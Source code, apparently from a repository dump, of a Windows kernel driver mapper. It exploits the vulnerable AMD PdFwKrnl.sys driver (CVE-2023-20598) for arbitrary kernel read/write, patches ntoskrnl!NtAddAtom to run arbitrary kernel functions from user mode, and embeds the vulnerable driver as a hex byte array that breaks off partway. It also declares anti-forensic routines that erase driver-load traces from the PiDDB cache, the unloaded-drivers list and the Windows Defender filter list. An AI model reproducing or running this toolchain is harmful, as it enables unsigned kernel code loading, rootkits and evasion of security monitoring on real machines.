		 * the five above because a miss here is normal on some builds and only
		 * degrades the DRIVER_OBJECT the mapper builds; it does not invalidate
		 * the offsets the kernel structure walks use.
		 */
		uint32_t object_fields = 0;
		object_fields += lookup(L"_DRIVER_OBJECT.Size", DriverObject_Size) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverStart", DriverObject_DriverStart) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverSize", DriverObject_DriverSize) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverExtension", DriverObject_DriverExtension) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.Flags", DriverObject_Flags) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverUnload", DriverObject_DriverUnload) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_EXTENSION.DriverObject", DriverExtension_DriverObject) ? 1u : 0u;
		DriverObjectResolvedCount = object_fields;
	}
};

namespace Driver
{
	extern DriverOffsets g_offsets;
	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;
	extern bool g_skipForensicCleanup;

	//Load the provider, resolve offsets, verify the PTE self-map and run the
	//cleanup walks. Tears everything down again on any failure.
	NTSTATUS Load();
	NTSTATUS Unload();
	NTSTATUS AcquireDebugPrivilege();

	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	bool IsRunning();
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);

	//Write to a page that is currently read-only, by temporarily making it
	//writable through the PTE self-map. See the implementation in Driver.cpp.
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);

	//The provider's memcpy. ReadMemory and WriteMemory are both this.
	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);

	uint64_t AllocatePool(Nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(uint64_t address);

	//Page aligned, physically contiguous allocation for the image. Needed
	//because a pool block's first and last page are shared with pool metadata.
	uint64_t AllocateContiguous(uint64_t size);
	bool MmFreeContiguousMemory(uint64_t address);

	/*
	 * Build the DRIVER_OBJECT handed to a mapped driver's DriverEntry.
	 *
	 * DriverEntry's contract is DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING).
	 * A driver calls IoCreateDevice before it has registered anything else, and
	 * that call dereferences DriverObject->DriverExtension and the extension's
	 * own back-pointer, so a NULL DriverObject is a guaranteed bugcheck rather
	 * than something a driver can ignore.
	 *
	 * Returns the address of the object, 0 on failure. Two nonpaged blocks are
	 * taken: the extension and the object itself, both zeroed before a single
	 * field is written, so a member the PDB did not describe is zero rather than
	 * whatever was in the pool.
	 *
	 * driver_start/driver_size describe the mapped image and land in DriverStart
	 * and DriverSize; driver_section is what belongs in DriverSection, and the
	 * caller passes the image base for a driver that has no real section.
	 *
	 * Every field is written through a helper that bounds the write inside the
	 * allocation, and every pointer written is checked to be one this process
	 * holds. The object is not registered anywhere: it is owned by the caller
	 * and must outlive DriverEntry, because a driver keeps a reference to it
	 * for as long as it is loaded.
	 */
	uint64_t CreateDriverObjectForEntry(uint64_t driver_start, uint64_t driver_size, uint64_t driver_section);

	//Releases both blocks CreateDriverObjectForEntry took. Only valid before
	//DriverEntry has been entered - see MapDriver for the lifetime rule.
	bool DestroyDriverObjectForEntry(uint64_t driver_object);

	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);

	//Resolve an export by name in a loaded kernel module, 0 when not found or
	//when any validation of the export directory fails.
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);

	/*
	 * Resolve an export by ordinal in a loaded kernel module, 0 when the ordinal
	 * is below the table base or above NumberOfFunctions.
	 *
	 * Uses the function-address table directly and does not need the name or
	 * ordinal tables, so it works for modules that export nothing by name.
	 */
	uint64_t GetKernelModuleExportOrdinal(uint64_t kernel_module_base, uint16_t ordinal);

	//Kernel helpers reached through the call hook below.
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	Nt::PiDDBCacheEntry* LookupEntry(Nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);

	//Trace removal. Each one is a no-op when its structure cannot be found and
	//returns false without writing when anything fails validation.
	//Skipped entirely when g_skipForensicCleanup is set.
	bool ClearPiDDBCacheTable();
	bool ClearKernelHashBucketList();
	bool ClearMmUnloadedDrivers();
	bool ClearWdFilterDriverList();

	/*
	 * Outcome of the most recent CallKernelFunction, as set by that call.
	 *
	 * Read it immediately after the call returns and before doing anything else,
	 * because the next call overwrites it. It exists for the one caller that
	 * owns memory the target may have adopted: CallKernelFunction returning true
	 * says the target ran, and this says whether ntoskrnl was left clean.
	 *
	 * A file scope inline variable rather than a local static, so the one piece of
	 * state it names is visible as such at the point it is read. It is still a
	 * plain bool with no synchronisation, which is correct for the single
	 * threaded flow this runs in and is not correct for two threads calling
	 * CallKernelFunction at once - see CallKernelFunction's own note for why that
	 * is not something a flag could fix anyway.
	 */
	inline bool g_restore_succeeded = false;

	inline bool& RestoreSucceeded() {
		return g_restore_succeeded;
	}

	/*
	 * Call an arbitrary kernel function from user mode.
	 *
	 * How it works: ntoskrnl!NtAddAtom is overwritten with
	 *
	 *     mov rax, <target>   ; 48 b8 <8 byte address>
	 *     jmp rax             ; ff e0
	 *
	 * Calling NtAddAtom from user mode therefore jumps to `target` in kernel
	 * context. The original 12 bytes are read back first and restored as soon
	 * as the call returns, so the hook exists only for the duration of one call.
	 *
	 * Why this is safe enough to do:
	 *   - the prologue is verified to look like real code before patching, so a
	 *     wrong address aborts instead of being written over
	 *   - a prologue that is already the hook shape means another instance is
	 *     running, which is refused
	 *   - the original bytes are restored on both the success and failure path
	 *   - the write itself goes through WriteToReadOnlyMemory, which requires a
	 *     verified PTE self-map
	 *
	 * Residual risk that cannot be designed away: if the process is killed
	 * between the patch and the restore, or the kernel crashes for an unrelated
	 * reason while patched, NtAddAtom is left pointing at the last target.
	 * Another process calling NtAddAtom during the hook window races the call
	 * to the target function. The window is ~10 instructions and cannot be
	 * closed without serialising every NtAddAtom call system-wide.
	 *
	 * Every argument must be trivially copyable and there can be at most 4 of
	 * them, since the hook passes everything through registers.
	 *
	 * T is the return type; T = void means no result is stored.
	 *
	 * Return value: whether the TARGET was invoked - that is, whether the hook
	 * was installed and the call was made. It deliberately does not report the
	 * restore, because the two must not be conflated:
	 *
	 *   - a false return means the target never ran, so nothing the caller
	 *     passed in has been touched and the caller is free to clean up
	 *   - a true return means the target ran and may have taken ownership of,
	 *     or written through, whatever the caller owns. Releasing that state
	 *     now would corrupt memory a running kernel object is using.
	 *
	 * That distinction is why the restore does not decide this return value.
	 * LastCallHookRestored() reports the restore separately; a caller that owns
	 * state the target may have adopted has to check it.
	 */
	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		//Only up to 4 arguments can be forwarded through the syscall jump.
		static_assert(sizeof...(A) <= 4, "CallKernelFunction: too many arguments");

		//Every return below leaves this false, so the caller's flag is only ever
		//set once the restore has actually been confirmed.
		RestoreSucceeded() = false;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to get ntdll.dll" << std::endl);
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom) {
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		//memcpy instead of a cast: writing through *(uint64_t*)&array[2] is an
		//unaligned access and undefined behaviour.
		memcpy(&kernel_injected_jmp[2], &kernel_function_address, sizeof(kernel_function_address));

		//Cached once resolved: the export is the same for the whole run, and
		//resolving it walks the kernel export directory.
		//
		//Retry-on-zero, not one-shot static initialisation. A one-shot
		//initialiser runs on the first call only, so a first call made before
		//ntoskrnlAddr was resolved cached 0 forever and every later call
		//reported the same failure without retrying. Same shape as the export
		//resolvers in Driver.cpp.
		//
		//One copy per instantiation, not one per process: each distinct argument
		//list A... gets its own variable, so each signature resolves NtAddAtom
		//once rather than sharing a single lookup. That is a redundant export
		//walk per signature on first use, which is not worth a template-level
		//cache with its own lifetime rules in exchange for.
		static uint64_t kernel_NtAddAtom = 0;
		if (!kernel_NtAddAtom) {
			kernel_NtAddAtom = GetKernelModuleExport(Driver::ntoskrnlAddr, "NtAddAtom");
			if (!kernel_NtAddAtom) {
				Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
				return false;
			}
		}

		if (!ReadMemory(kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked! another instance of Mapper running?!" << std::endl);
			return false;
		}

		//Pre-flight: refuse to patch anything that does not look like the
		//beginning of a function. Failing here is safe, clobbering a wrong
		//address is a guaranteed bugcheck.
		//Accepts the REX prefixes, push/pop, the common mov-immediate form, and
		//the endbr64 that CET enabled builds start functions with. Rejects
		//int3 padding and anything all zeroes, which is what free memory looks
		//like when the address is wrong.
		auto looks_like_function_prologue = [](const uint8_t* bytes) -> bool {
			uint8_t nonzero = 0;
			for (int i = 0; i < 12; ++i) {
				if (bytes[i] == 0xCC) //int3 padding
					return false;
				if (bytes[i] != 0)
					nonzero++;
			}
			if (nonzero < 2)
				return false;

			switch (bytes[0]) {
			case 0x40: case 0x41: case 0x44: case 0x48: case 0x49:
			case 0x4C: case 0x4D: case 0x50: case 0x51: case 0x52:
			case 0x53: case 0x54: case 0x55: case 0x56: case 0x57:
			case 0xB8: case 0xE9: case 0x0F:
				return true;
			case 0xF3:
				return (bytes[1] == 0x0F && bytes[2] == 0x1E); //endbr64
			default:
				return false;
			}
		};

		if (!looks_like_function_prologue(original_kernel_function)) {
			Log(L"[-] FAILED!: ntoskrnl.NtAddAtom does not look like code, refusing to patch" << std::endl);
			return false;
		}

		if (!WriteToReadOnlyMemory(kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		/*
		 * From here the target runs. Everything above could fail without the
		 * kernel having executed anything; everything below must be treated as
		 * cleanup of state that may already have been modified.
		 */
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		/*
		 * Restore the original bytes.
		 *
		 * Attempted twice. The second attempt exists because the failure mode
		 * is a transient fault in the provider's copy (the same stale-TLB window
		 * WriteToReadOnlyMemory documents), not a refused write - which a
		 * second attempt pastes into.
		 *
		 * Whatever the outcome, the target has already run, so this function
		 * returns true: the caller must learn that the kernel state it passed in
		 * may have been taken over. A failure to restore is reported through
		 * hook_restored instead, because folding it into the return value is
		 * what previously let a caller release memory a running kernel object
		 * was using.
		 */
		bool restored = WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));

		if (!restored) {
			Log(L"[!] NtAddAtom restore failed, retrying" << std::endl);
			restored = WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
		}

		if (!restored) {
			//ntoskrnl is still patched. Say so plainly: the process must not exit
			//believing the hook is gone, because NtAddAtom will jump into the
			//last target until something else restores it.
			Log(L"[!!] CRITICAL: ntoskrnl.NtAddAtom is still hooked after a "
				"failed restore. Do not terminate this process: every NtAddAtom "
				"call on this machine now jumps to the last target until the page "
				"is repaired." << std::endl);
		}
		else {
			RestoreSucceeded() = true;
		}

		return true;
	}
}

```

### D:\Ameger\Mapper\Mapper\Provider\Provider.hpp â€” 63 lines â€” sha12:7BCE6C108182
```c-header
#pragma once

#include <Windows.h>
#include <cstdint>

/*
 * The vulnerable driver that provides the kernel read/write primitive.
 *
 * A "provider" is a legitimately signed third-party driver with a hole that
 * gives arbitrary kernel memory access. Everything above this layer (mapping,
 * relocations, imports, kernel calls, anti-forensics) is provider independent;
 * only the device name and the memcpy IOCTL below differ.
 *
 * The embedded driver resource (Resource.hpp) MUST contain the .sys binary of
 * this provider, otherwise loading it will fail.
 *
 *  AMD PdFwKrnl.sys - AMD USB-C Power Delivery Firmware Update Utility driver,
 *  CVE-2023-20598. Ships with AMD Radeon Software up to and including 23.9.1.
 *  Device: \Device\PdFwKrnl  IOCTL: 0x80002014
 *
 * The request carries raw source/destination virtual addresses that the driver
 * memcpy's without validation, so it is a direct virtual read/write. It cannot
 * write to read-only pages, which is handled through the PTE self-map in
 * Driver.cpp.
 */

namespace Provider
{
	//Device path opened with CreateFileW. "\\.\PdFwKrnl" resolves to the
	//kernel device \Device\PdFwKrnl.
	constexpr const wchar_t* kDeviceName = L"\\\\.\\PdFwKrnl";

	//Human readable name, used only in log output.
	constexpr const wchar_t* kShortName = L"AMD PdFwKrnl";

	//The IOCTL that performs the unchecked copy.
	constexpr ULONG32 kCopyIoctl = 0x80002014;

	/*
	 * Layout of the IOCTL input buffer.
	 *
	 * The driver validates the size of this buffer but not the pointers inside
	 * it, which is the bug: it is handed an arbitrary read or write.
	 *
	 * Packed because the driver indexes the fields by byte offset. The three
	 * reserved fields are not reserved by us - they are expected to be zero
	 * and are passed through untouched.
	 */
#pragma pack(push, 1)
	struct CopyRequest {
		BYTE Reserved[16];
		PVOID Destination;
		PVOID Source;
		PVOID Reserved2;
		DWORD Size;
		DWORD Reserved3;
	};
#pragma pack(pop)

	//Fill a CopyRequest with the three values that matter.
	//This is the whole provider abstraction: MemCopy in Driver.cpp calls this
	//and issues the IOCTL, and every other memory helper in the project is
	//built on top of it.
	inline void FillCopyRequest(CopyRequest& request, uint64_t destination, uint64_t source, uint64_t length) {
		request = CopyRequest{};
		request.Destination = (PVOID)destination;
		request.Source = (PVOID)source;
		request.Size = (DWORD)length;
	}
}
```

### D:\Ameger\Mapper\Mapper\Provider\Resource.hpp â€” 763 lines â€” sha12:81C8B65DA8FB
```c-header
#pragma once
#include <stdint.h>

// PdFwKrnl.sys - AMD USB-C Power Delivery Firmware Update Utility driver (CVE-2023-20598)
// KDU provider 44, SHA1 A24840E32071E0F64E1DFF8CA540604896811587, 30144 bytes
namespace Resource
{
	static const uint8_t driver[] = {
		0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
		0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
		0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD1, 0x77, 0xBD, 0xFD, 0x95, 0x16, 0xD3, 0xAE, 0x95, 0x16, 0xD3, 0xAE, 0x95, 0x16, 0xD3, 0xAE, 0xDE, 0x6E, 0xD2, 0xAF, 0x96, 0x16, 0xD3, 0xAE, 0x95, 0x16, 0xD2, 0xAE, 0x84, 0x16, 0xD3, 0xAE,
		0xDE, 0x6E, 0xD0, 0xAF, 0x96, 0x16, 0xD3, 0xAE, 0xDE, 0x6E, 0xD7, 0xAF, 0x91, 0x16, 0xD3, 0xAE, 0x16, 0x6F, 0xDB, 0xAF, 0x94, 0x16, 0xD3, 0xAE, 0x16, 0x6F, 0x2C, 0xAE, 0x94, 0x16, 0xD3, 0xAE, 0x16, 0x6F, 0xD1, 0xAF, 0x94, 0x16, 0xD3, 0xAE,
		0x52, 0x69, 0x63, 0x68, 0x95, 0x16, 0xD3, 0xAE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x07, 0x00,
		0x61, 0x9E, 0xA4, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00, 0x0B, 0x02, 0x0E, 0x1F, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x15, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
		0x37, 0x89, 0x00, 0x00, 0x01, 0x00, 0xE0, 0x41, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x08, 0x04, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00,
		0x00, 0x24, 0x00, 0x00, 0xC0, 0x51, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x80, 0x22, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x21, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x6A, 0x09, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x04, 0x05, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x02, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x62, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00, 0x08, 0x04, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48,
		0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x8B, 0xFA, 0x48, 0x89, 0x5A, 0x38, 0x89, 0x5A, 0x30, 0x80, 0x38, 0x0E, 0x8B, 0x50, 0x10, 0x48, 0x8B, 0x77, 0x18, 0x0F, 0x85, 0x98, 0x03, 0x00, 0x00, 0x8B, 0x40, 0x18, 0x05, 0x00, 0xE0,
		0xFF, 0x7F, 0x83, 0xF8, 0x2C, 0x0F, 0x87, 0x87, 0x03, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB6, 0xEF, 0xFF, 0xFF, 0x48, 0x89, 0x6C, 0x24, 0x40, 0x41, 0x0F, 0xB6, 0x84, 0x00, 0x28, 0x14, 0x00, 0x00, 0x41, 0x8B, 0x8C, 0x80, 0xF4, 0x13, 0x00, 0x00,
		0x49, 0x03, 0xC8, 0xFF, 0xE1, 0xCC, 0xCC, 0xCC, 0xCC, 0x83, 0xFA, 0x10, 0x0F, 0x85, 0x4C, 0x03, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x45, 0x33, 0xC0, 0x8B, 0x56, 0x08, 0x48, 0xFF, 0x15, 0x96, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48,
		0x8B, 0xE8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x3F, 0x01, 0x00, 0x00, 0x8B, 0x56, 0x08, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x5D, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00,
		0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x04, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x3A, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xA9, 0x0F, 0x00, 0x00, 0x0F,
		0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xD3, 0x8B, 0x08, 0x89, 0x0E, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x7B, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0x4C, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00,
		0x00, 0x8B, 0x56, 0x08, 0xE9, 0x9B, 0x00, 0x00, 0x00, 0x83, 0xFA, 0x10, 0x0F, 0x85, 0xAC, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x45, 0x33, 0xC0, 0x41, 0x8D, 0x50, 0x04, 0x48, 0xFF, 0x15, 0xF5, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00,
		0x48, 0x8B, 0xE8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x9E, 0x00, 0x00, 0x00, 0x8B, 0x56, 0x08, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0xBC, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00,
